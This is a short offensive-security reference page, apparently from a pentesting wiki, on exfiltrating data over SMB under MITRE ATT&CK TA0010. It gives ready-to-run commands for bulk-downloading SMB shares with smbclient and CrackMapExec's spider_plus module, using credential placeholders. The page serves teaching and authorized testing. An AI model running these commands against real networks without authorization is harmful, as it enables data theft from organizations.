---
description: MITRE ATT&CK™ - Exfiltration - Tactic TA0010
---

# Over SMB

## Theory

SMB (Server Message Block) exfiltration refers to the unauthorized extraction or transfer of data from a compromised network or system using SMB protocols. Attackers can leverage SMB to transfer sensitive or valuable information from an organization's network to an external location.

## Practice

{% tabs %}
{% tab title="smbclient" %}
Tools like [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) can be used to recursively download a SMB share's content.

```bash
# In an smbclient interactive session
recurse ON
prompt OFF
mget *
```
{% endtab %}

{% tab title="CrackMapExec" %}
Tools like [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) can be used to recursively download a SMB share's content.

```bash
crackmapexec smb $IP -u $USERNAME -p $PASSWORD -M spider_plus -o READ_ONLY=False
```

The previous command generates a json file with the list of accessible files in shares. We may use jq to parse this json output.

```bash
cat 10.10.10.111.json | jq '. | map_values(key)'
```
{% endtab %}
{% endtabs %}
